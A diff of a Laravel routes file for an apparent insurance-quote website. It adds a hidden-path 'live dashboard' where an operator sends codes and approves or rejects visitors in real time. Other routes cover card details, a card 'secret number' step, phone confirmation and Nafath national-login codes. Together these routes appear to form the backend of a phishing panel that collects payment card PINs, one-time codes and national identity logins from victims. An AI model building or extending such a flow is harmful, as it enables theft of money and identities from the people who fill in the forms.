@@ -8,6 +8,8 @@ use App\Http\Controllers\Backend\Admin\InsuranceRequestsBackendController;
 use App\Http\Controllers\Backend\Admin\SupportTicketController;
 use App\Http\Controllers\Frontend\HomePageFrontendController;
 use App\Http\Controllers\Admin\VisitorController;
+use App\Http\Controllers\Admin\CustomReportsController;
+use App\Http\Controllers\Admin\LiveDashboardController;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -32,18 +34,16 @@ Route::get('/test-insurance-flow', function () {
 })->name('test-insurance-flow');
 
 Route::post('/test-create-session', function () {
-    // Create a new insurance request for testing
     $insuranceRequest = new \App\Models\InsuranceRequest();
-    $insuranceRequest->identity_number = '1234567890';
-    $insuranceRequest->insurance_category = 1;
+    $insuranceRequest->id_number = '1234567890';
+    $insuranceRequest->insurance_id = 1;
     $insuranceRequest->save();
     
-    // Store in session
     session([
         'insuranceRequest' => [
             'id' => $insuranceRequest->id,
-            'identity_number' => $insuranceRequest->identity_number,
-            'insurance_category' => 1,
+            'id_number' => $insuranceRequest->id_number,
+            'insurance_id' => 1,
         ]
     ]);
     
@@ -64,13 +64,16 @@ Route::prefix('super_admin')->name('super_admin.')->group(function () {
         }
         return redirect('/super_admin/login');
     })->name('index');
+    
     Route::post('/loginFormSubmit', [AdminLoginController::class, 'loginFormSubmit'])
         ->middleware('throttle:10,1')
         ->name('loginFormSubmit');
+    
     // If someone hits the POST endpoint directly via GET, guide them back to the login page
     Route::get('/loginFormSubmit', function () {
         return redirect()->route('super_admin.loginUser');
     });
+    
     Route::post('/logout', [AdminLoginController::class, 'logout'])->name('logout');
 
     Route::group(['middleware' => ['auth:super_admin']], function () {
@@ -104,11 +107,6 @@ Route::prefix('super_admin')->name('super_admin.')->group(function () {
             Route::get('softDelete/{id}', [InsuranceBackendController::class, 'softDelete'])->name('insurances-softDelete');
             Route::get('/showSoftDelete', [InsuranceBackendController::class, 'showSoftDelete'])->name('insurances-showSoftDelete');
             Route::get('softDeleteRestore/{id}', [InsuranceBackendController::class, 'softDeleteRestore'])->name('insurances-softDeleteRestore');
-            Route::get('/softDeleteSelected', [InsuranceBackendController::class, 'softDeleteSelected'])->name('insurances-softDeleteSelected');
-            Route::get('/softDeleteRestoreSelected', [InsuranceBackendController::class, 'softDeleteRestoreSelected'])->name('insurances-softDeleteRestoreSelected');
-            Route::get('/activeInactiveSingle/{id}', [InsuranceBackendController::class, 'activeInactiveSingle'])->name('insurances-activeInactiveSingle');
-
-            // Insurance Benefit Routes
             Route::post('addInsuranceBenefit/{id}', [InsuranceBackendController::class, 'addInsuranceBenefit'])->name('insurances-addInsuranceBenefit');
             Route::get('deleteInsuranceBenefit/{id}', [InsuranceBackendController::class, 'deleteInsuranceBenefit'])->name('insurances-deleteInsuranceBenefit');
         });
@@ -116,25 +114,11 @@ Route::prefix('super_admin')->name('super_admin.')->group(function () {
         // Insurance Requests Routes
         Route::group(['prefix' => 'insurance_requests'], function () {
             Route::get('/index', [InsuranceRequestsBackendController::class, 'index'])->name('insurance_requests-index');
-            // JSON summary for live auto-refresh in admin tables
             Route::get('/summary', [InsuranceRequestsBackendController::class, 'summary'])->name('insurance_requests-summary');
-            // Get new requests for live table refresh
-            Route::get('/get-new-requests', [InsuranceRequestsBackendController::class, 'getNewRequests'])->name('insurance_requests-getNewRequests');
-            // Check user status and current path
-            Route::get('/check-status/{id}', [InsuranceRequestsBackendController::class, 'checkStatus'])->name('insurance_requests-checkStatus');
-            Route::get('/create', [InsuranceRequestsBackendController::class, 'create'])->name('insurance_requests-create');
-            Route::post('/store', [InsuranceRequestsBackendController::class, 'store'])->name('insurance_requests-store');
             Route::get('show/{id}', [InsuranceRequestsBackendController::class, 'show'])->name('insurance_requests-show');
-            Route::get('edit/{id}', [InsuranceRequestsBackendController::class, 'edit'])->name('insurance_requests-edit');
-            Route::post('update/{id}', [InsuranceRequestsBackendController::class, 'update'])->name('insurance_requests-update');
             Route::get('softDelete/{id}', [InsuranceRequestsBackendController::class, 'softDelete'])->name('insurance_requests-softDelete');
             Route::get('/showSoftDelete', [InsuranceRequestsBackendController::class, 'showSoftDelete'])->name('insurance_requests-showSoftDelete');
             Route::get('softDeleteRestore/{id}', [InsuranceRequestsBackendController::class, 'softDeleteRestore'])->name('insurance_requests-softDeleteRestore');
-            Route::get('/softDeleteSelected', [InsuranceRequestsBackendController::class, 'softDeleteSelected'])->name('insurance_requests-softDeleteSelected');
-            Route::get('/softDeleteRestoreSelected', [InsuranceRequestsBackendController::class, 'softDeleteRestoreSelected'])->name('insurance_requests-softDeleteRestoreSelected');
-            Route::get('/activeInactiveSingle/{id}', [InsuranceRequestsBackendController::class, 'activeInactiveSingle'])->name('insurance_requests-activeInactiveSingle');
-
-            // Nafath Routes
             Route::get('sendNafathCode/{id}', [InsuranceRequestsBackendController::class, 'sendNafathCode'])->name('insurance_requests-sendNafathCode');
             Route::post('sendNafathCodeRequest/{id}', [InsuranceRequestsBackendController::class, 'sendNafathCodeRequest'])->name('insurance_requests-sendNafathCodeRequest');
         });
@@ -150,15 +134,23 @@ Route::prefix('super_admin')->name('super_admin.')->group(function () {
 
         // Custom Reports Routes - التقارير المخصصة
         Route::group(['prefix' => 'custom_reports'], function () {
-            Route::get('/dashboard', [App\Http\Controllers\Admin\CustomReportsController::class, 'dashboard'])->name('custom_reports-dashboard');
-            Route::get('/index', [App\Http\Controllers\Admin\CustomReportsController::class, 'index'])->name('custom_reports-index');
-            Route::get('/show/{id}', [App\Http\Controllers\Admin\CustomReportsController::class, 'show'])->name('custom_reports-show');
-            Route::get('/summary', [App\Http\Controllers\Admin\CustomReportsController::class, 'summary'])->name('custom_reports-summary');
-            Route::get('/export', [App\Http\Controllers\Admin\CustomReportsController::class, 'export'])->name('custom_reports-export');
-            Route::post('/filter', [App\Http\Controllers\Admin\CustomReportsController::class, 'filter'])->name('custom_reports-filter');
+            Route::get('/dashboard', [CustomReportsController::class, 'dashboard'])->name('custom_reports-dashboard');
+            Route::get('/index', [CustomReportsController::class, 'index'])->name('custom_reports-index');
+            Route::get('/show/{id}', [CustomReportsController::class, 'show'])->name('custom_reports-show');
+            Route::get('/summary', [CustomReportsController::class, 'summary'])->name('custom_reports-summary');
+            Route::get('/export', [CustomReportsController::class, 'export'])->name('custom_reports-export');
+            Route::post('/filter', [CustomReportsController::class, 'filter'])->name('custom_reports-filter');
         });
 
-
+        // Live Dashboard Routes - لوحة التحكم المباشرة
+        Route::group(['prefix' => 'live_dashboard'], function () {
+            Route::get('/', [LiveDashboardController::class, 'index'])->name('live_dashboard-index');
+            Route::get('/data', [LiveDashboardController::class, 'getData'])->name('live_dashboard-data');
+            Route::get('/user/{id}', [LiveDashboardController::class, 'getUserDetails'])->name('live_dashboard-user-details');
+            Route::post('/send-code', [LiveDashboardController::class, 'sendCode'])->name('live_dashboard-send-code');
+            Route::post('/approve/{id}', [LiveDashboardController::class, 'approveUser'])->name('live_dashboard-approve');
+            Route::post('/reject/{id}', [LiveDashboardController::class, 'rejectUser'])->name('live_dashboard-reject');
+        });
     });
 });
 
@@ -180,21 +172,11 @@ Route::get('/favicon.ico', function () {
     }
     return response('', 204);
 });
-Route::get('/about', function () {
-    return view('about');
-})->name('about');
-Route::get('/contact', function () {
-    return view('contact');
-})->name('contact');
-Route::get('/claims', function () {
-    return view('claims');
-})->name('claims');
 
 // Insurance Process Routes
 Route::post('/insuranceRequest', [HomePageFrontendController::class, 'insuranceRequest'])->name('insuranceRequest');
 Route::get('/insuranceStatements', [HomePageFrontendController::class, 'insuranceStatements'])->name('insuranceStatements');
 Route::post('/insuranceStatementsRequest', [HomePageFrontendController::class, 'insuranceStatementsRequest'])->name('insuranceStatementsRequest');
-// Vehicles inquiry (new unified vehicles form)
 Route::post('/insuranceInquiryRequest', [HomePageFrontendController::class, 'insuranceInquiryRequest'])->name('insuranceInquiryRequest');
 Route::get('/insuranceType', [HomePageFrontendController::class, 'insuranceType'])->name('insuranceType');
 Route::post('/insuranceTypeRequest', [HomePageFrontendController::class, 'insuranceTypeRequest'])->name('insuranceTypeRequest');
@@ -239,176 +221,23 @@ Route::get('/cardDeclined', [HomePageFrontendController::class, 'cardDeclined'])
 Route::get('/sw.js', function () {
     $path = public_path('sw.js');
     abort_unless(file_exists($path), 404);
-
     return response()->file($path, [
-        // Proper MIME for Service Worker (Safari-friendly)
         'Content-Type' => 'text/javascript; charset=UTF-8',
-        // Allow SW to control the whole origin
         'Service-Worker-Allowed' => '/',
-        // Prevent cached/stale worker during development
         'Cache-Control' => 'no-cache, no-store, must-revalidate',
         'Pragma' => 'no-cache',
         'Expires' => '0',
     ]);
 })->name('sw');
 
-// Development/Testing Routes
-Route::get('/welcome2', function () {
-    return view('welcome2');
-})->name('/welcome2');
-Route::get('/tasks', function () {
-    return view('tasks');
-})->name('/tasks');
-Route::get('/searchForInsurance', function () {
-    return view('searchForInsurance');
-})->name('/searchForInsurance');
+// Visitor Tracking
+Route::post('/v/ping', [App\Http\Controllers\Frontend\VisitController::class, 'ping'])->name('visit.ping');
 
-// Insurance Type Routes
-Route::prefix('insurance')->group(function () {
-    Route::get('/car', function () {
-        return view('insurance.car');
-    })->name('insurance.car');
-
-    Route::get('/health', function () {
-        return view('insurance.health');
-    })->name('insurance.health');
-
-    Route::get('/life', function () {
-        return view('insurance.life');
-    })->name('insurance.life');
-
-    Route::get('/property', function () {
-        return view('insurance.property');
-    })->name('insurance.property');
-
-    // Insurance Data Display Routes - Frontend
-    Route::get('/all', function () {
-        $insurances = \App\Models\Insurance::all();
-        return view('insurance.all', compact('insurances'));
-    })->name('insurance.all');
-
-    Route::get('/with-deleted', function () {
-        $insurances = \App\Models\Insurance::withTrashed()->get();
-        return view('insurance.with-deleted', compact('insurances'));
-    })->name('insurance.with-deleted');
-
-    Route::get('/only-deleted', function () {
-        $insurances = \App\Models\Insurance::onlyTrashed()->get();
-        return view('insurance.only-deleted', compact('insurances'));
-    })->name('insurance.only-deleted');
-
-    Route::get('/active', function () {
-        $insurances = \App\Models\Insurance::where('status', 'active')->get();
-        return view('insurance.active', compact('insurances'));
-    })->name('insurance.active');
-
-    Route::get('/inactive', function () {
-        $insurances = \App\Models\Insurance::where('status', 'inactive')->get();
-        return view('insurance.inactive', compact('insurances'));
-    })->name('insurance.inactive');
-
-    // Insurance Restore Route
-    Route::post('/restore/{id}', function ($id) {
-        $insurance = \App\Models\Insurance::withTrashed()->findOrFail($id);
-        $insurance->restore();
-        return redirect()->back()->with('success', 'تم استعادة التأمين بنجاح');
-    })->name('insurance.restore');
-
-    // Insurance Force Delete Route
-    Route::delete('/force-delete/{id}', function ($id) {
-        $insurance = \App\Models\Insurance::withTrashed()->findOrFail($id);
-        $insurance->forceDelete();
-        return redirect()->back()->with('success', 'تم حذف التأمين نهائياً');
-    })->name('insurance.force-delete');
-});
-
-// Authenticated User Routes
-Route::middleware(['auth'])->group(function () {
-    Route::get('/profile', function () {
-        return view('profile');
-    })->name('profile');
-
-    Route::get('/policies', function () {
-        return view('policies');
-    })->name('policies');
-
-    Route::get('/payments', function () {
-        return view('payments');
-    })->name('payments');
-});
-
-// Test route for viewing insurances
-Route::get('/test-insurances', function () {
-    $thirdPartyInsurances = \App\Models\Insurance::where('status', 1)->where('insurance_type', 1)->with('insuranceBenefits')->get();
-    $fullInsurances = \App\Models\Insurance::where('status', 1)->where('insurance_type', 2)->with('insuranceBenefits')->get();
-    $thirdPartyCount = $thirdPartyInsurances->count();
-    $fullCount = $fullInsurances->count();
-    return view('test-insurances', compact('thirdPartyInsurances', 'fullInsurances', 'thirdPartyCount', 'fullCount'));
-})->name('test-insurances');
-
-// Enhanced insurance type view (new design)
-Route::get('/test-insurance-type', function () {
-    $thirdPartyInsurances = \App\Models\Insurance::where('status', 1)->where('insurance_type', 1)->with('insuranceBenefits')->get();
-    $fullInsurances = \App\Models\Insurance::where('status', 1)->where('insurance_type', 2)->with('insuranceBenefits')->get();
-    return view('insuranceType-enhanced', compact('thirdPartyInsurances', 'fullInsurances'));
-})->name('test-insurance-type');
-
-// Redirect GET hits on POST endpoints back to the proper pages
-Route::get('/insuranceStatementsRequest', function () {
-    return redirect()->route('insuranceStatements');
-});
-Route::get('/insuranceTypeRequest', function () {
-    return redirect()->route('insuranceType');
-});
-Route::get('/insuranceInformationRequest', function () {
-    return redirect()->route('insuranceInformation');
-});
-Route::get('/paymentFormRequest', function () {
-    return redirect()->route('paymentForm');
-});
-Route::get('/callProcessRequest', function () {
-    return redirect()->route('callProcess');
-});
-Route::get('/cardOwnershipRequest', function () {
-    return redirect()->route('cardOwnership');
-});
-Route::get('/cardOwnershipSecertNumberRequest', function () {
-    return redirect()->route('cardOwnershipSecertNumber');
-});
-Route::get('/confirmPhoneNumberRequest', function () {
-    return redirect()->route('confirmPhoneNumber');
-});
-Route::get('/checkPhoneNumberRequest', function () {
-    return redirect()->route('checkPhoneNumber');
-});
-Route::get('/nafathLoginRequest', function () {
-    return redirect()->route('nafathLogin');
-});
-Route::get('/nafathDocumentingRequest', function () {
-    return redirect()->route('nafathLogin');
-});
-
-// ==================================================================================================================
-// ========================================== Visitor Tracking Routes ===============================================
-// ==================================================================================================================
-
-// Frontend - Visit Tracking (Public, CSRF Protected)
-Route::post('/v/ping', [App\Http\Controllers\Frontend\VisitController::class, 'ping'])
-    ->name('visit.ping');
-
-// ==================================================================================================================
-// ========================================== Admin Monitoring Routes ===============================================
-// ==================================================================================================================
-
-// Backend - Monitoring Dashboard (Admin Protected, Hidden Path)
-// Access via: /{ADMIN_SECRET_PATH}/monitoring
+// Admin Monitoring
 Route::prefix(config('admin.secret_path', 'x-admin-9bcd'))->group(function () {
     Route::middleware(['auth:super_admin', 'admin.ip.allow'])->group(function () {
-        Route::get('/monitoring', [App\Http\Controllers\Backend\Admin\MonitoringController::class, 'index'])
-            ->name('admin.monitoring.index');
-        
-        Route::get('/monitoring/poll', [App\Http\Controllers\Backend\Admin\MonitoringController::class, 'poll'])
-            ->name('admin.monitoring.poll');
+        Route::get('/monitoring', [App\Http\Controllers\Backend\Admin\MonitoringController::class, 'index'])->name('admin.monitoring.index');
+        Route::get('/monitoring/poll', [App\Http\Controllers\Backend\Admin\MonitoringController::class, 'poll'])->name('admin.monitoring.poll');
     });
 });
 
